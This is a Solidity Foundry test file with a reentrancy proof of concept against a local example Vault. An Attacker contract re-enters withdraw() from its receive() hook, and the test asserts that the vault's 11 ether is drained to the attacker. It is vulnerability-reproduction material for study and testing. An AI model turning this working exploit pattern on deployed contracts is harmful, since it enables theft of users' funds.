// SPDX-License-Identifier: MIT
// SELF-MADE EXAMPLE ONLY — a reentrancy PoC against the local example
// Vault (src/Vault.sol). It targets NO live program and NO real protocol.
// The test PASSES when the vulnerability reproduces (vault drained).
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract Attacker {
    Vault public vault;

    constructor(Vault _vault) {
        vault = _vault;
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            // Low-level call + ignore failure: on a fixed vault the
            // reentrant call reverts, the outer send still succeeds,
            // and the attacker only gets its own deposit back.
            (bool s, ) = address(vault).call(
                abi.encodeWithSignature("withdraw()")
            );
            s;
        }
    }

    function attack() external {
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }
}

contract ReentrancyPoC is Test {
    Vault vault;
    Attacker attacker;

    function setUp() public {
        vault = new Vault();
        // Victim funds seeded into the vault.
        vm.deal(address(this), 20 ether);
        vault.deposit{value: 10 ether}();
        attacker = new Attacker(vault);
        vm.deal(address(attacker), 2 ether);
    }

    function testReentrancyReproduces() public {
        attacker.attack();
        assertEq(address(vault).balance, 0, "vault not drained");
        assertEq(address(attacker).balance, 12 ether, "attacker did not profit");
    }
}
